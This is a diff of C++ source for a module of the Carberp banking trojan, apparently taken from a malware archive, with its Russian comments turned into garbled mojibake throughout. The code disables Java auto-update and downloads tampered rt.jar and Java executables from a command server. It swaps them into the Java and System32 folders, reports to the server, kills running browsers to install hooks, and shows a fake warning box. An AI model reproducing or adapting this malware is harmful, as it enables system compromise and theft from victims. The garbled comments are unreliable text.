@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include "Modules.h"
 
@@ -33,18 +44,18 @@ struct FILE_CRC32
 	unsigned long crc32;
 };
 
-static int javaVersion = 0; //версия явы в формате 106 == 1.6
-static int javaVersion2 = 0; //версия явы в формате 10600 == 1.6.0
-static int javaBuild = 0; //билд или апдейт текущей версии явы 
-static int javaCompatible = 0; //совместимость явы для разных алгоритмов установки патча
-static char javaHome[MAX_PATH]; //папка явы
-static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
+static int javaVersion = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 106 == 1.6
+static int javaVersion2 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 10600 == 1.6.0
+static int javaBuild = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 
+static int javaCompatible = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+static char javaHome[MAX_PATH]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+static char javaMSI[MAX_PATH]; //пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-char versionPatch[] = "1.8"; //версия патча
+char versionPatch[] = "1.8"; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-static char domain[128]; //адрес админки
+static char domain[128]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ true пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ false. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ javaHome пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 static bool GetJavaVersion()
 {
 	bool res = false;
@@ -59,7 +70,7 @@ static bool GetJavaVersion()
 	char* ver1 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, "CurrentVersion" );
 	if( ver1 )
 	{
-		//извлекаем домашнюю папку явы
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		char keyVer[MAX_PATH];
 		m_lstrcpy( keyVer, nameKeyJava );
 		pPathAppendA( keyVer, ver1 );
@@ -67,19 +78,19 @@ static bool GetJavaVersion()
 		m_lstrcpy( javaHome, s );
 		STR::Free(s);
 		DBG( "JavaPatcher", "java home: %s", javaHome );
-		//конвертируем версию явы в целое число
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		char* p = STR::Scan( ver1, '.' );
 		if( p ) 
 		{
 			*p = 0;
-			javaVersion = StrToInt(ver1) * 100 + StrToInt(p + 1); //в результате получаем 1.6 в 106
+			javaVersion = StrToInt(ver1) * 100 + StrToInt(p + 1); //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1.6 пїЅ 106
 			const char* family = (javaVersion == 106) ? "Java6FamilyVersion" : "Java7FamilyVersion";
 			char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, (char*)family );
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 			pwsprintfA( javaMSI, "%s\\%s\\MSI", nameKeyJava, ver2 ); 
 			if( ver2 )
 			{
-				//анализируем строку вида 1.6.0_30
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 1.6.0_30
 				p = STR::Scan( ver2, '.' );
 				if( p )
 				{
@@ -92,7 +103,7 @@ static bool GetJavaVersion()
 							*p = *p2 = *p3 = 0;
 							javaVersion2 = StrToInt(ver2) * 10000 + StrToInt(p + 1) * 100 + StrToInt(p2 + 1); //1.6.0 -> 10600
 							javaBuild = StrToInt(p3 + 1);
-							//устанавливаем совместимость
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							switch( javaVersion )
 							{
 								case 106: //1.6
@@ -125,7 +136,7 @@ static bool GetJavaVersion()
 	return res;
 }
 
-//отключает в реестре автообновление явы, функция работает только после выполнении функции GetJavaVersion()
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetJavaVersion()
 static bool OffUpdateJava()
 {
 	if( !Registry::SetValueString( HKEY_LOCAL_MACHINE, javaMSI, "AUTOUPDATECHECK", "0" ) )
@@ -134,7 +145,7 @@ static bool OffUpdateJava()
 		return false;
 	if( !Registry::SetValueDWORD( HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Update\\Policy", "EnableJavaUpdate", 0 ) )
 		return false;
-	DBG( "JavaPatcher", "отключено обновление явы" );
+	DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ" );
 	return true;
 }
 
@@ -162,14 +173,14 @@ static char* GetJavaPatcherURL( char* url )
 	return url;
 }
 
-//инициализирует глобальные переменные 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 static bool InitData()
 {
 	return GetJavaPatcherURL(domain) != NULL;
 }
 
 
-//возвращает рабочую папу для патчера, и если указано, то добавляем имя файла
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static char* GetWorkFolder( char* path, const char* fileName = 0 )
 {
 	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA ,  0, 0, path );
@@ -202,7 +213,7 @@ static void SendLogToAdmin( int num )
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
-	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
+	DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %s", qr );
 	HTTPResponse::Clear(&Response);
 	STR::Free(qr);
 }
@@ -260,7 +271,7 @@ static bool UID_To_File(char* BotUid)
 				BotUid = _BotUid;
 			}
 
-			DBG( "JavaPatcher", ">>>>>>>>>>>>>>> Пишем уид в файл  %s", BotUid);
+			DBG( "JavaPatcher", ">>>>>>>>>>>>>>> пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ  %s", BotUid);
 
 			if( File::WriteBufferA( uidTxt, BotUid, m_lstrlen(BotUid) ) > 0 )
 				return true;
@@ -281,7 +292,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 		return false;
 	}
 
-	// Сохраняем путь в lib папку jre для возврата
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ lib пїЅпїЅпїЅпїЅпїЅ jre пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_lstrcpy( libPath, javaHome );
 	pPathAppendA( libPath, "lib" );
 
@@ -329,7 +340,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 		return false;
 	}
 
-	//установка файла-флага
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ
 	pPathAppendA( allUsersProfile, "copy.dat" );
 	File::WriteBufferA( allUsersProfile, 0, 0 );
 
@@ -351,7 +362,7 @@ static char* DownloadPlugin( char *url, DWORD *dwLen, bool crypt )
 
 static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
 {
-	FILE_CRC32* filesСrc32 = 0;
+	FILE_CRC32* filesпїЅrc32 = 0;
 	int count = 0;
 	
 	char url[256];
@@ -379,17 +390,17 @@ static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
 			char* val = STR::Scan( part, '=' );
 			if( val )
 			{
-				filesСrc32 = (FILE_CRC32*)MemRealloc( filesСrc32, (count + 2) * sizeof(FILE_CRC32) );
-				m_memset( filesСrc32 + count + 1, 0, sizeof(FILE_CRC32) );
+				filesпїЅrc32 = (FILE_CRC32*)MemRealloc( filesпїЅrc32, (count + 2) * sizeof(FILE_CRC32) );
+				m_memset( filesпїЅrc32 + count + 1, 0, sizeof(FILE_CRC32) );
 
-				*val++ = 0; //разделили имя файла и значение crc32
+				*val++ = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ crc32
 
 				int lenKey = m_lstrlen(part);
-				if( lenKey > sizeof(filesСrc32->fileName) - 1 )
-					lenKey = sizeof(filesСrc32->fileName) - 1;
-				m_memcpy( filesСrc32[count].fileName, part, lenKey );
-				filesСrc32[count].fileName[lenKey] = 0;
-				filesСrc32[count].crc32 = (unsigned long)STR::ToDWORD(val);
+				if( lenKey > sizeof(filesпїЅrc32->fileName) - 1 )
+					lenKey = sizeof(filesпїЅrc32->fileName) - 1;
+				m_memcpy( filesпїЅrc32[count].fileName, part, lenKey );
+				filesпїЅrc32[count].fileName[lenKey] = 0;
+				filesпїЅrc32[count].crc32 = (unsigned long)STR::ToDWORD(val);
 				count++;
 			}
 			crc32Data2 = 0;
@@ -397,7 +408,7 @@ static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
 	}
 	STR::Free(crc32Data);
 
-	return filesСrc32;
+	return filesпїЅrc32;
 }
 
 static unsigned long GetCorrectCRC32( FILE_CRC32* filesCrc32, const char* fileName )
@@ -446,7 +457,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 		else
 		{
 			DBG( "JavaPatcher", "Failed Download %s", url );
-			pSleep(3 * 60000); //ждем 3 минуты, и потом снова пытаемся загрузить
+			pSleep(3 * 60000); //пїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		}
 	}
 	return res;
@@ -480,7 +491,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
 		return false;
 */
-	//загрузка файлов во временную папку
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	char Path[MAX_PATH], fileName[MAX_PATH];
 	pGetTempPathA( sizeof(Path), Path );
 /*
@@ -538,7 +549,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
 		return false;
 */
-	//загрузка в папку ALLUSERSPROFILE
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ ALLUSERSPROFILE
 	//GetAllUsersProfile( Path, sizeof(Path) );
 	if( GetWorkFolder(Path) == 0 )
 		return false;
@@ -602,7 +613,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
 
 #ifdef AzConfigH
-	//сохраняем домены
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char* mem = (char*)HEAP::Alloc(1024);
 	*mem = 0;
 	TStrEnum E(GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
@@ -633,13 +644,13 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 
 	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath;
 
-	int res = 1; //не все загрузилось
+	int res = 1; //пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe, javaExew ) )
 	{
 		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, libPatch ) )
-			res = 0; //все прошло успешно
+			res = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		else
-			res = 2; //все загрузили, но патч не установился
+			res = 2; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 	
 	Directory::Delete(tmpRtPath);
@@ -754,7 +765,7 @@ bool WINAPI ClearAndDel( LPVOID lpData )
 	HCURSOR hIbeam=(HCURSOR)pLoadCursorA(0,IDC_IBEAM);
 	HCURSOR hArrow=(HCURSOR)pLoadCursorA(0,IDC_ARROW);
 	HMODULE Lib=(HMODULE)pLoadLibraryA("riched20");
-	ShowHypeMessageBox(0,"У вас старая версия явы,работа на ней не поддерживается,\nскачайте новую версию на сайте http://www.java.com", "Warning", MB_ICONASTERISK);
+	ShowHypeMessageBox(0,"пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ,пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ http://www.java.com", "Warning", MB_ICONASTERISK);
 	//pFreeLibrary(Lib);
 	return false;
 }
@@ -764,7 +775,7 @@ bool WINAPI ClearAndDel( LPVOID lpData )
 /*
 static bool WJFile()
 {
-	// Функция создаёт файл пидов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	char wj[MAX_PATH];
 	GetAllUsersProfile( wj, sizeof(wj), "wj.dat" );
 	
@@ -787,7 +798,7 @@ static bool WJFile()
 } */
 
 
-// Функция создаёт файл пидов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static bool WJFile()
 {
 	char wj[MAX_PATH];
@@ -810,7 +821,7 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	pPathAppendA( srcJava.str(), java );
 	pPathAppendA( dstJava.str(), javao );
 	bool ret = true;
-	if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
+	if( !File::IsExists(dstJava.str()) ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
 		{
@@ -831,7 +842,7 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 		{
 			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
 		}
-		else //не удалось скопировать, сделаем это после ребута
+		else //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			ret = false;
 			int err = pGetLastError();
@@ -842,13 +853,13 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	return ret;
 }
 
-//возвращает true если патч установлен
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ true пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool JavaPatchInstalled()
 {
 	char uidTxt[MAX_PATH];
 	if( GetWorkFolder( uidTxt, "uid.txt" ) == 0 )
 		return true;
-	if( File::IsExists(uidTxt) ) //уже пропатчили
+	if( File::IsExists(uidTxt) ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return true;
 	return false;
 }
@@ -856,8 +867,8 @@ bool JavaPatchInstalled()
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 
-	// При включенном модуле инсталяции Fake DLL
-	// запускаем установку библиотеки
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Fake DLL
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef FakeDllInstallerH
         FDI::Install();
 	#endif
@@ -872,7 +883,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 	PCHAR javaUrl = STR::New( 2, domain, "rt_jar/" );
 
-	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
+	DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ %s", javaUrl );
 
 	DWORD userLen = user.size();
 	bool res = false;
@@ -903,19 +914,19 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			else
 			{
 				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
-				resPatch = 3; //не скопировался rt.jar
+				resPatch = 3; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ rt.jar
 				//pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );			
 			}
 			res = true;
-			//Подменяем яву
-			//Сначала в основной папке явы
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			m_lstrcpy( folderJava.str(), javaHome );
 			pPathAppendA( folderJava.str(), "bin" );
 			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), folderJava.str() );
 			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str(), folderJava.str() );
 			if( res ) SendLogToAdmin(4);
 
-			//подменяем в системной папке Windows\System32
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Windows\System32
 			pSHGetFolderPathA( 0, CSIDL_SYSTEM,  0, 0, folderJava.str() );
 			bool res1 = ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), folderJava.str() );
 			res1 &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str(), folderJava.str() );
@@ -926,29 +937,29 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			
 			res |= res1;
 
-			if( !res ) //не удалось что-то заменить, делаем перезагрузку
+			if( !res ) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
-				resPatch = 4; //не заменились java.exe и javaw.exe
+				resPatch = 4; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ java.exe пїЅ javaw.exe
 				#ifdef KillOs_RebootH
 				//SendLogToAdmin(6);
 				//Reboot();
 				#endif
 			}
 			else
-				SendLogToAdmin(6); //успешная установка патча
+				SendLogToAdmin(6); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 */
 		};
 
 		resPatch = 2;
-		if( resPatch > 0 ) //все файлы загрузились но по какой-то причине не установлся патч
+		if( resPatch > 0 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		{
 			char buf[1];
 			buf[0] = resPatch + '0';
-			//сообщаем что патч не установился
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			GetWorkFolder( path.str(), "PatchFail.txt" );
 			File::WriteBufferA( path.str(), &buf, 1 );
-			KillBlockingProcesses("\\lib\\rt.jar"); //уничтожаем процессы для которых нужно проводить подмену строк
-			KillAllBrowsers(); //уничтожаем все браузеры, чтобы патч работал через хуки
+			KillBlockingProcesses("\\lib\\rt.jar"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+			KillAllBrowsers(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		}
 	}
 
@@ -957,7 +968,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	return res;
 };
 
-// Функция отправляет setup_patch в отдельном потоке
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ setup_patch пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
 {
 	SendLogToAdmin( (int)num );
@@ -967,7 +978,7 @@ DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
-	if( !JavaPatchInstalled() ) //если патч не установлен, то ставим
+	if( !JavaPatchInstalled() ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
 		{
 			while( true )
@@ -986,14 +997,14 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 				pSleep(5000);
 			}
 		}
-	//если патч был не до конца установлен, то пробуем ставить хуки
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	while( !SetJavaPatcherHook() ) pSleep(5000);
 	return 0;
 }
 
 bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 {
-	DBG( "JavaPatcher", "Обновление явы JavaPatch");
+	DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ JavaPatch");
 	char fileName[MAX_PATH];
 	
 	if( GetWorkFolder( fileName, JavaPatcherPidsFile ) )
@@ -1032,7 +1043,7 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	char path[MAX_PATH];
 	m_lstrcpy( path, javaHome );
 	pPathAppendA( path, "lib" );
-	//удаляем rt.jar и rt2.jar и rt.ini 
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ rt.jar пїЅ rt2.jar пїЅ rt.ini 
 	DeletePatchFile( path, "rt.jar" );
 	DeletePatchFile( path, "rt_.jar" );
 	DeletePatchFile( path, "rt2.jar" );
@@ -1048,7 +1059,7 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	return 0;
 }
 
-// Функция добавляет пид текущего процесса в файл
